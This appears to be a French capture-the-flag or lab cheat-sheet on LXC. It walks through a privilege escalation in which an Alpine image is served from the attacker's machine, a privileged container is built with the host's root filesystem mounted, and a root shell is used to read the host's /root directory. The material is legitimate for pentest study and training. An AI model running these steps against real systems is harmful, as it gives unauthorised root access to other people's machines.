# lxc

## Container

```bash
$ lxc ls
+------+-------+------+------+------+-----------+
| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
+------+-------+------+------+------+-----------+
```

### privileged

```bash
$ lxc launch images:alpine/edge mon_container -c security.privileged=true
Creating mon_container
```


## Images

```bash
$ lxc image list
+-------+-------------+--------+-------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+------+------+-------------+
```


## Création image avec privesc
### Prépa
```bash
# wget https://dl-cdn.alpinelinux.org/alpine/v3.20/releases/x86_64/alpine-minirootfs-3.20.3-x86_64.tar.gz
--2026-10-03 17:25:06--  https://dl-cdn.alpinelinux.org/alpine/v3.20/releases/x86_64/alpine-minirootfs-3.20.3-x86_64.tar.gz
Resolving dl-cdn.alpinelinux.org (dl-cdn.alpinelinux.org)... 151.101.122.132, 2a04:4e42:1d::644
Connecting to dl-cdn.alpinelinux.org (dl-cdn.alpinelinux.org)|151.101.122.132|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3490290 (3.3M) [application/octet-stream]
Saving to: ‘alpine-minirootfs-3.20.3-x86_64.tar.gz’

alpine-minirootfs-3.20.3-x86_64.tar.gz                100%[=======================================================================================================================>]   3.33M  --.-KB/s    in 0.09s   

2026-10-03 17:25:06 (35.8 MB/s) - ‘alpine-minirootfs-3.20.3-x86_64.tar.gz’ saved [3490290/3490290]
```

```bash
# cat << 'EOF' > metadata.yaml
architecture: x86_64
creation_date: 1700000000
properties:
  os: Alpine
  release: 3.20
EOF

tar -czvf metadata.tar.gz metadata.yaml
metadata.yaml
```

### envoi
```bash
┌──(root㉿kali)-[~/machines/included/alpine]
└─# python3 -m http.server 8099


$ wget http://10.10.14.78:8099/alpine-minirootfs-3.20.3-x86_64.tar.gz
$ wget http://10.10.14.78:8099/metadata.tar.gz
```

### Démarrage

```bash
$ lxc image import metadata.tar.gz alpine-minirootfs-3.20.3-x86_64.tar.gz --alias alpine-official
$ lxc init alpine-official privesc-container -c security.privileged=true
$ lxc config device add privesc-container host-root disk source=/ path=/mnt/root recursive=true

Device host-root added to privesc-container
```

```bash
$ lxc start privesc-container
$ lxc exec privesc-container /bin/sh
~ # id      
id
uid=0(root) gid=0(root)
```

```shell
~ # cd /mnt/root/root
/mnt/root/root # ls -la
total 40
drwx------ 7 root root 4096 Apr 23 2021 .
drwxr-xr-x 24 root root 4096 Oct 11 2021 ..
lrwxrwxrwx 1 root root 9 Mar 11 2020 .bash_history ->
/dev/null
-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrc
drwx------ 2 root root 4096 Apr 23 2021 .cache
drwxr-x--- 3 root root 4096 Mar 11 2020 .config
drwx------ 3 root root 4096 Apr 23 2021 .gnupg
drwxr-xr-x 3 root root 4096 Mar 5 2020 .local
-rw-r--r-- 1 root root 148 Aug 17 2015 .profile
drwx------ 2 root root 4096 Apr 23 2021 .ssh
-r-------- 1 root root 33 Mar 9 2020 root.txt
```